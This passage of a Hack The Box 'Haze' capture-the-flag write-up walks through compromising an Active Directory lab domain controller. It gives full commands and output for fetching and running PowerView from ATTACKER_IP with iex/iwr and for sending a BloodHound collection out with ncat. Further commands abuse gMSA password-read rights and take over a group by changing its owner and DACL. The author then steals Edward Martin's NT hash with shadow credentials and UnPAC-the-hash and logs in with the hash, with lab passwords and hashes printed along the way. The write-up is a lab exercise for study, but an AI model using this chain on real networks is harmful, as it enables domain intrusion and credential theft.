LDAP                     10.10.11.61     389    DC01             Users                                    membercount: 3
LDAP                     10.10.11.61     389    DC01             Guests                                   membercount: 2
LDAP                     10.10.11.61     389    DC01             IIS_IUSRS                                membercount: 1
LDAP                     10.10.11.61     389    DC01             Certificate Service DCOM Access          membercount: 1
LDAP                     10.10.11.61     389    DC01             Remote Management Users                  membercount: 2
LDAP                     10.10.11.61     389    DC01             Schema Admins                            membercount: 1
LDAP                     10.10.11.61     389    DC01             Enterprise Admins                        membercount: 1
LDAP                     10.10.11.61     389    DC01             Cert Publishers                          membercount: 1
LDAP                     10.10.11.61     389    DC01             Domain Admins                            membercount: 1
LDAP                     10.10.11.61     389    DC01             Group Policy Creator Owners              membercount: 1
LDAP                     10.10.11.61     389    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
LDAP                     10.10.11.61     389    DC01             Windows Authorization Access Group       membercount: 1
LDAP                     10.10.11.61     389    DC01             Denied RODC Password Replication Group   membercount: 8
LDAP                     10.10.11.61     389    DC01             gMSA_Managers                            membercount: 1
LDAP                     10.10.11.61     389    DC01             Splunk_Admins                            membercount: 1
LDAP                     10.10.11.61     389    DC01             Backup_Reviewers                         membercount: 1
LDAP                     10.10.11.61     389    DC01             Splunk_LDAP_Auth                         membercount: 1
```

These groups are interesting.  
`Mark Adams` is shown to be a member of the `gMSA_Managers` group.
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "mark.adams" -p 'Ld@p_Auth_Sp1unk@2k24' --groups gMSA_Managers
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             Mark Adams

fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "mark.adams" -p 'Ld@p_Auth_Sp1unk@2k24' --groups Splunk_Admins
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             Alexander Green

fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "mark.adams" -p 'Ld@p_Auth_Sp1unk@2k24' --groups Backup_Reviewers
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             Edward Martin

fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "mark.adams" -p 'Ld@p_Auth_Sp1unk@2k24' --groups Splunk_LDAP_Auth
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             Paul Taylor
```

#### BloodHound

BloodHound is excellent to visualize the AD environment.  `SharpHound` is used to gather the domain information.
So, `SharpHound.exe` had to be run on the server to gather information about AD object relationships.

`SharpHound.exe`, which is installed as part of the `sharphound` package on Kali was copied to the `www` directory.
```
fcoomans@kali:~/htb/haze$ locate SharpHound.exe
/usr/share/metasploit-framework/data/post/SharpHound.exe
/usr/share/sharphound/SharpHound.exe
/usr/share/sharphound/SharpHound.exe.config

fcoomans@kali:~/htb/haze$ dpkg -S /usr/share/sharphound/SharpHound.exe
sharphound: /usr/share/sharphound/SharpHound.exe

fcoomans@kali:~/htb/haze$ cp /usr/share/sharphound/SharpHound.exe www
```

`ncat.exe`, which is installed as part of the `ncat-w32` package on Kali was also copied to the `www` directory
```
fcoomans@kali:~/htb/haze$ locate ncat.exe
/usr/share/windows-resources/ncat/ncat.exe

fcoomans@kali:~/htb/haze$ dpkg -S /usr/share/windows-resources/ncat/ncat.exe
ncat-w32: /usr/share/windows-resources/ncat/ncat.exe

fcoomans@kali:~/htb/haze$ cp /usr/share/windows-resources/ncat/ncat.exe www
```

A Python web server was started to serve the files.
```
fcoomans@kali:~/htb/haze$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

The tools were then downloaded from the attack host to the target.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> iwr http://ATTACKER_IP:8000/SharpHound.exe -outfile SharpHound.exe
*Evil-WinRM* PS C:\Users\mark.adams\Documents> iwr http://ATTACKER_IP:8000/ncat.exe -outfile ncat.exe
```

Programs that need to interact with Active Directory cannot simply be run in `evil-winrm`.  This is due to the double-hop problem which prevents the Kerberos TGT from being added to the `evil-winrm` session.
So, in order to run `SharpHound.exe` and other commands that need to communicate with AD, a `PSCredential` is created and used with `Invoke-Command` to get a TGT and to interact with Active Directory.
`SharpHound.exe` was run inside the `Invoke-Command` `ScriptBlock`.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> klist

Current LogonId is 0:0x70df000

Cached Tickets: (0)
*Evil-WinRM* PS C:\Users\mark.adams\Documents> $pass = ConvertTo-SecureString 'Ld@p_Auth_Sp1unk@2k24' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\mark.adams\Documents> $cred = New-Object System.Management.Automation.PSCredential('HAZE\mark.adams', $pass)
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { .\SharpHound.exe -c All }
2025-06-28T09:01:04.4410336-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-06-28T09:01:04.6441551-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-28T09:01:04.6910295-07:00|INFORMATION|Initializing SharpHound at 9:01 AM on 6/28/2025
2025-06-28T09:01:04.7222802-07:00|INFORMATION|Resolved current domain to haze.htb
2025-06-28T09:01:04.8941603-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-28T09:01:05.0035297-07:00|INFORMATION|Beginning LDAP search for haze.htb
2025-06-28T09:01:05.1441585-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HAZE.HTB
2025-06-28T09:01:05.1441585-07:00|INFORMATION|Beginning LDAP search for haze.htb Configuration NC
2025-06-28T09:01:05.1754066-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HAZE.HTB
2025-06-28T09:01:05.2379053-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-06-28T09:01:05.2379053-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-06-28T09:01:05.5035330-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HAZE.HTB
2025-06-28T09:01:18.8941582-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-06-28T09:01:18.9254107-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-06-28T09:01:19.0816539-07:00|INFORMATION|Status: 344 objects finished (+344 24.57143)/s -- Using 44 MB RAM
2025-06-28T09:01:19.0816539-07:00|INFORMATION|Enumeration finished in 00:00:14.0879713
2025-06-28T09:01:19.1754103-07:00|INFORMATION|Saving cache with stats: 20 ID to type mappings.
 1 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2025-06-28T09:01:19.2066538-07:00|INFORMATION|SharpHound Enumeration Completed at 9:01 AM on 6/28/2025! Happy Graphing!
*Evil-WinRM* PS C:\Users\mark.adams\Documents> ls


    Directory: C:\Users\mark.adams\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/28/2025   9:01 AM          35975 20250628090106_BloodHound.zip
-a----         6/28/2025   9:07 AM        1667584 ncat.exe
-a----         6/28/2025   9:01 AM           1595 NzBkNGM2ZWYtODFhYy00M2M0LTgzNzMtNmViNTQ1NzJhN2Nk.bin
-a----         6/28/2025   8:59 AM        1286656 SharpHound.exe
```

A `ncat` listener was started on the attack host to receive the SharpHound collection file.
```
fcoomans@kali:~/htb/haze/bloodhound$ ncat -lnp 4444 --recv-only >20250628090106_BloodHound.zip
```

`ncat.exe` was used on the target to send the file to the attack host.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> cmd /c "ncat.exe ATTACKER_IP 4444 --send-only <20250628090106_BloodHound.zip"
```

The sha256 hash for the file was retrieved on the target.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-FileHash 20250628090106_BloodHound.zip

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          539E028D5254090AD060CCC5EB6559D78E43B07566F7B60E95771281F3D37956       C:\Users\mark.adams\Documents\20250628090106_BloodHound.zip
```

And checked against the sha256 hash for the file on Kali.  This confirmed that the file was transferred without any corruption.
```
fcoomans@kali:~/htb/haze/bloodhound$ sha256sum 20250628090106_BloodHound.zip
539e028d5254090ad060ccc5eb6559d78e43b07566f7b60e95771281f3d37956  20250628090106_BloodHound.zip
```

BloodHound was started and the collection file was ingested.

![](images/Pasted%20image%2020250628101538.png)

BloodHound only confirmed that `Mark Adams` is a member of `GMSA_MANAGERS` and `REMOTE MANAGEMENT USERS`.

![](images/Pasted%20image%2020250628102116.png)

#### PowerView

I decided to use PowerView to see if the `gMSA_Managers` group can manipulate any AD Object ACEs.

`PowerView.ps1` was copied to the `www` directory.  `PowerView.ps1` is part of the `powersploit` package on Kali.
```
fcoomans@kali:~/htb/haze$ locate PowerView.ps1
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1

fcoomans@kali:~/htb/haze$ dpkg -S PowerView.ps1
powersploit: /usr/share/windows-resources/powersploit/Recon/PowerView.ps1

fcoomans@kali:~/htb/haze$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 www
```

A Python web server was started on Kali to share `PowerView.ps1`.
```
fcoomans@kali:~/htb/haze$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`PowerView.ps1` was used to check if the `gMSA_Managers` group could had any ACE rights to other AD Objects.
`gMSA_Managers` can manipulate the `ms-DS-GroupMSAMembership` ACE on the Group Managed Service Account (gMSA) `CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb`.
The `ms-DS-GroupMSAMembership` ACE allows members to view the NTLM password for the gMSA.
gMSA passwords are 240 bytes long and is changed automatically every 30 days by AD server.
This misconfiguration can allow an attacker to add an account to the gMSA and then get the NTLM password.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> klist

Current LogonId is 0:0x70df000

Cached Tickets: (0)
*Evil-WinRM* PS C:\Users\mark.adams\Documents> $pass = ConvertTo-SecureString 'Ld@p_Auth_Sp1unk@2k24' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\mark.adams\Documents> $cred = New-Object System.Management.Automation.PSCredential('HAZE\mark.adams', $pass)
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { iex (iwr http://ATTACKER_IP:8000/PowerView.ps1 -UseBasicParsing); $sid = Convert-NameToSid "gMSA_Managers"; Get-ObjectAcl -ResolveGUIDs |Where-Object { $_.SecurityIdentifier -eq $sid } }


AceQualifier           : AccessAllowed
ObjectDN               : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : ms-DS-GroupMSAMembership
ObjectSID              : S-1-5-21-323145914-28650650-2368316563-1111
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-323145914-28650650-2368316563-1107
AccessMask             : 32
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
PSComputerName         : DC01
RunspaceId             : a5cb6670-5498-4b09-a591-223132e46cf6

AceType               : AccessAllowed
ObjectDN              : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
ActiveDirectoryRights : ReadProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             : S-1-5-21-323145914-28650650-2368316563-1111
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-323145914-28650650-2368316563-1107
AccessMask            : 131092
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
PSComputerName        : DC01
RunspaceId            : a5cb6670-5498-4b09-a591-223132e46cf6
```

`nxc` and confirmed that Mark cannot read the password for any gMSAs.
If Mark is added, then that user will be able to retrieve and use the gMSA NTLM hash.
```
fcoomans@kali:~/htb/haze/bloodhound$ nxc ldap dc01.haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 --gmsa
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: Domain Admins
```

### Exploitation

#### gMSA

`PowerView` was used to get the SIDs for `mark.adams` and `Domain Admins`.
`Set-ADServiceAccount` with  `-PrincipalsAllowedToRetrieveManagedPassword` was then used to add Mark as a principal that can retrieve the gMSA password hashes.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Invoke-Command -ComputerName . -Credential $cred -ScriptBlock { iex (iwr http://ATTACKER_IP:8000/PowerView.ps1 -UseBasicParsing); $sid = Convert-NameToSid "mark.adams"; $daSid = Convert-NameToSid "Domain Admins"; Set-ADServiceAccount -Identity Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword @($sid, $daSid) }
```

The `nxc` command was run again and the NTLM hash for `Haze-IT-Backup$` was revealed.
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 --gmsa
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM: 4de830d1d58c14e241aff55f82ecdba1     PrincipalsAllowedToReadPassword: ['Domain Admins', 'mark.adams']
```

The `Set-ADServiceAccount` cmdlet was then used to reset the value and only allow `Domain Admins` to read the gMSA NTLM hash.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Invoke-Command -ComputerName . -Credential $cred -ScriptBlock { iex (iwr http://ATTACKER_IP:8000/PowerView.ps1 -UseBasicParsing); $daSid = Convert-NameToSid "Domain Admins"; Set-ADServiceAccount -Identity Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword @($daSid) }
```

`nxc` was used to check the hash and it was found to be valid.
```
fcoomans@kali:~/htb/haze$ nxc smb dc01.haze.htb -u 'Haze-IT-Backup$' -H 4de830d1d58c14e241aff55f82ecdba1
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\Haze-IT-Backup$:4de830d1d58c14e241aff55f82ecdba1
```

#### Support_Services

BloodHound shows that `Haze-IT-Backup$` has `WriteOwner` rights on the `Support_Services` group object.
Clicking on `Linux Abuse` shows exactly how to exploit this right from Linux.

![](images/Pasted%20image%2020250628110659.png)

First `impacket-owneredit` was used to make `Haze-IT-Backup$` the owner of the `Support_Services` group.
```
fcoomans@kali:~/htb/haze$ impacket-owneredit -hashes :4de830d1d58c14e241aff55f82ecdba1 -dc-ip dc01.haze.htb -new-owner 'Haze-IT-Backup$' -target 'Support_Services' -action write 'HAZE/Haze-IT-Backup$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-323145914-28650650-2368316563-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb
[*] OwnerSid modified successfully!
```

Then `impacket-dacledit` was used to give `Haze-IT-Backup$` full rights over the `Support_Services` group.
```
fcoomans@kali:~/htb/haze$ impacket-dacledit -hashes :4de830d1d58c14e241aff55f82ecdba1 -dc-ip dc01.haze.htb -principal 'Haze-IT-Backup$' -target 'Support_Services' -action write 'HAZE/Haze-IT-Backup$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20250628-190316.bak
[*] DACL modified successfully!
```

The final step was to add `Haze-IT-Backup$` as a member to the `Support_Services` group.
```
fcoomans@kali:~/htb/haze$ pth-net rpc group addmem "Support_Services" "Haze-IT-Backup$" -U "HAZE/Haze-IT-Backup$%00000000000000000000000000000000:4de830d1d58c14e241aff55f82ecdba1" -S "dc01.haze.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

`nxc` confirmed that `Haze-IT-Backup` is now a member of the `Support_Services` group.
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 --groups Support_Services
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             Haze-IT-Backup
```

I was stuck here for quite a while!
But remembered that the server also runs an Active Directory Certificate Services (ADCS) Certificate Authority (CA) to issue certificates.  
Can this somehow be exploited?

#### ADCS

I researched and found these very interesting articles on Kerberos authentication using ADCS:
https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash

If `Haze-IT-Backup$` through it's membership to `Support_Services` has permission to request certificates for users, then this can be abused to take over that account.

The articles states that the tool `pywhisker` can be used to request the certificate from ADCS.
`PKINITtools` can be used to request a Kerberos TGT by using the certificate.  
The NTLM hash for the account can then be retrieved.

The `pywhisker` repo is cloned from https://github.com/ShutdownRepo/pywhisker
```
fcoomans@kali:~/htb/haze$ git clone https://github.com/ShutdownRepo/pywhisker.git
Cloning into 'pywhisker'...
remote: Enumerating objects: 235, done.
remote: Counting objects: 100% (106/106), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 235 (delta 75), reused 75 (delta 66), pack-reused 129 (from 1)
Receiving objects: 100% (235/235), 2.10 MiB | 8.45 MiB/s, done.
Resolving deltas: 100% (115/115), done.
```

A Python virtual environment named `venv_pywhisker` is created and `pywhisker` is installed using `pip`.
```
fcoomans@kali:~/htb/haze$ python -m venv venv_pywhisker

fcoomans@kali:~/htb/haze$ . ./venv_pywhisker/bin/activate

(venv_pywhisker)fcoomans@kali:~/htb/haze$ cd pywhisker

(venv_pywhisker)fcoomans@kali:~/htb/haze/pywhisker$ pip install .
Processing /home/fcoomans/htb/haze/pywhisker
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting impacket (from pywhisker==0.1.0)
  Using cached impacket-0.12.0-py3-none-any.whl
Collecting ldap3 (from pywhisker==0.1.0)
  Using cached ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
<SNIP>

(venv_pywhisker)fcoomans@kali:~/htb/haze/pywhisker$ cd ..
```

As a test, `pywhisker` is used to request a certificate for `mark.adams`, but this fails.
```
(venv_pywhisker)fcoomans@kali:~/htb/haze$ pywhisker -a add -t mark.adams --dc-ip 10.10.11.61 --dc-host dc01.haze.htb -u Haze-IT-Backup$ -H 4de830d1d58c14e241aff55f82ecdba1 -e PFX -f mark -P Password123!
[*] Searching for the target account
[*] Target user found: CN=Mark Adams,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d7944b0c-56b3-27f7-471e-ea3d746d3c3f
[*] Updating the msDS-KeyCredentialLink attribute of mark.adams
[!] Could not modify object, the server reports insufficient rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

I look at the AD groups and see that `edward.martin` is also a member of the `Remote Management Users` group and can therefore `evil-winrm` to the server.  
`pywhisker` is used to request a certificate for `edward.martin` instead and this time it works!
```
(venv_pywhisker)fcoomans@kali:~/htb/haze$ pywhisker -a add -t edward.martin --dc-ip 10.10.11.61 --dc-host dc01.haze.htb -u Haze-IT-Backup$ -H 4de830d1d58c14e241aff55f82ecdba1 -e PFX -f edward -P Password123!
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 4d30f579-17a1-4fbd-2ce2-d2f4522f31a1
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: edward.pfx
[+] PFX exportiert nach: edward.pfx
[i] Passwort für PFX: Password123!
[+] Saved PFX (#PKCS12) certificate & key at path: edward.pfx
[*] Must be used with password: Password123!
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

(venv_pywhisker)fcoomans@kali:~/htb/haze$ deactivate
```

`pywhisper` tells me to use `PKINITtools` to get the TGT.
Before I do that, I update `/etc/krb5.conf` with the `HAZE.HTB` domain and server info.  This is needed when requesting a TGT from the Kerberos server.
```
fcoomans@kali:~/htb/haze$ cat /etc/krb5.conf
[libdefaults]
        default_realm = HAZE.HTB

<SNIP>

[realms]
<SNIP>
        HAZE.HTB = {
                kdc = DC01.haze.htb
                admin_server = DC01.haze.htb
                default_domain = haze.htb
        }

[domain_realm]
<SNIP>
        .haze.htb = HAZE.HTB
        haze.htb = HAZE.HTB
```

The https://github.com/dirkjanm/PKINITtools repo was then cloned.
```
fcoomans@kali:~/htb/haze$ git clone https://github.com/dirkjanm/PKINITtools.git
Cloning into 'PKINITtools'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 45 (delta 14), reused 10 (delta 10), pack-reused 27 (from 1)
Receiving objects: 100% (45/45), 28.08 KiB | 4.68 MiB/s, done.
Resolving deltas: 100% (21/21), done.
```

Another Python virtual environment named `venv_pkinit` is created for `PKINITtools`.  After activating the virtual environment, `pip` is used to install the requirements.
```
fcoomans@kali:~/htb/haze$ cd PKINITtools

fcoomans@kali:~/htb/haze/PKINITtools$ python -m venv venv_pkinit

fcoomans@kali:~/htb/haze/PKINITtools$ . ./venv_pkinit/bin/activate

(venv_pkinit)fcoomans@kali:~/htb/haze/PKINITtools$ pip install -r requirements.txt
Collecting impacket (from -r requirements.txt (line 1))
  Using cached impacket-0.12.0-py3-none-any.whl
Collecting minikerberos (from -r requirements.txt (line 2))
  Using cached minikerberos-0.4.6-py3-none-any.whl.metadata (734 bytes)
<SNIP>
```

`ntpdate` was run again to sync the time with the server, to prevent the clock skew issue.
```
(venv_pkinit)fcoomans@kali:~/htb/haze/PKINITtools$ sudo ntpdate dc01.haze.htb
2025-06-28 20:32:03.381859 (+0200) +1084.166063 +/- 0.077891 dc01.haze.htb 10.10.11.61 s1 no-leap
CLOCK: time stepped by 1084.166063
```

`gettgtpkinit` requested a TGT for Edward using the certificate.
```
(venv_pkinit)fcoomans@kali:~/htb/haze/PKINITtools$ cd ..

(venv_pkinit)fcoomans@kali:~/htb/haze$ python PKINITtools/gettgtpkinit.py -cert-pfx edward.pfx -pfx-pass Password123! -dc-ip 10.10.11.61 "haze.htb/edward.martin" emartin.ccache
2025-06-28 20:33:36,748 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-28 20:33:36,797 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-28 20:33:48,242 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-28 20:33:48,242 minikerberos INFO     d94ab1745df9c36f664182dc7cbd170d6c59e96b00a3a0c2446fff96bb364a02
INFO:minikerberos:d94ab1745df9c36f664182dc7cbd170d6c59e96b00a3a0c2446fff96bb364a02
2025-06-28 20:33:48,253 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

The `KRB5CCNAME` variable was created and exported to tell Kerberos tools on Kali where to read the Kerberos credential cache file. 
`klist` was run and confirmed that a TGT was issued to user Edward Martin.
```
(venv_pkinit)fcoomans@kali:~/htb/haze$ export KRB5CCNAME=/home/fcoomans/htb/haze/emartin.ccache

(venv_pkinit)fcoomans@kali:~/htb/haze$ klist
Ticket cache: FILE:/home/fcoomans/htb/haze/emartin.ccache
Default principal: edward.martin@HAZE.HTB

Valid starting       Expires              Service principal
06/28/2025 20:33:59  06/29/2025 06:33:59  krbtgt/HAZE.HTB@HAZE.HTB
```

`getnthash` used the the AS-REP encryption key from the `gettgtpkinit.py` output above to get the NTLM hash for `edward.martin`.
```
(venv_pkinit)fcoomans@kali:~/htb/haze$ python PKINITtools/getnthash.py -key 'd94ab1745df9c36f664182dc7cbd170d6c59e96b00a3a0c2446fff96bb364a02' -dc-ip 10.10.11.61 'haze.htb/edward.martin'
/home/fcoomans/htb/haze/PKINITtools/venv_pkinit/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
09e0b3eeb2e7a6b0d419e9ff8f4d91af

(venv_pkinit)fcoomans@kali:~/htb/haze$ deactivate
```

`nxc` was used to confirm the validity of the NTLM hash.
```
fcoomans@kali:~/htb/haze$ nxc smb dc01.haze.htb -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

The NTLM hash was used to log into the target as user `edward.martin` using `evil-winrm`.
```
fcoomans@kali:~/htb/haze$ evil-winrm -i dc01.haze.htb -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami
haze\edward.martin
*Evil-WinRM* PS C:\Users\edward.martin\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.61
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

### Post Exploitation

Edward doesn't have any noteworthy privileges, but is a member of the `Backup_Reviewers` group.
```
*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
HAZE\Backup_Reviewers                       Group            S-1-5-21-323145914-28650650-2368316563-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

#### user.txt flag

`edward.martin` is the holder of the `user.txt` flag.
```
